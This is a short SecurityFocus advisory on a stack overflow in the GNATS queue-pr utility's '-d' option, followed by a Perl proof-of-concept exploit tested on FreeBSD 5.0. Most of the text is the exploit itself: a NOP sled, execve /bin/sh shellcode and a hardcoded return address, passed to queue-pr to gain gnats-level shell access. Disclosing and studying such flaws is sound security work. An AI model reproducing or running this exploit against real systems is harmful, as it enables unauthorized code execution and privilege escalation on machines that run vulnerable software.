source: http://www.securityfocus.com/bid/8232/info

A stack overflow vulnerability has been reported for the queue-pr utility of GNATS. The vulnerability occurs due to insufficient checks performed on the arguments to the '-d' commandline option. 

Successful exploitation may result in the execution of attacker-supplied code with potentially elevated privileges.

#!/usr/bin/perl

# Simple PoC exploit for gnats
# Tested on FreeBSD 5.0 with gnats-3.113.1_6
# if all works it gives gnats access

# Code by inv[at]dtors

$ret_hex = 0xbfbffb90;
$shellcode ="\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x53\x52\x31\xc0\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
$nops = "\x90"x1110;
$ret = pack('l', $ret_hex);

$exploit = "$nops"."$shellcode"."$ret"."$ret";
local($ENV{'EXP'}) = $exploit; 

print "\ndtors gnats exploit\n";
print "code by inv\n\n";
print ("Address: 0x", sprintf('%lx', $ret_hex),"\n\n");

system('/usr/local/libexec/gnats/queue-pr -d $EXP -O bbb');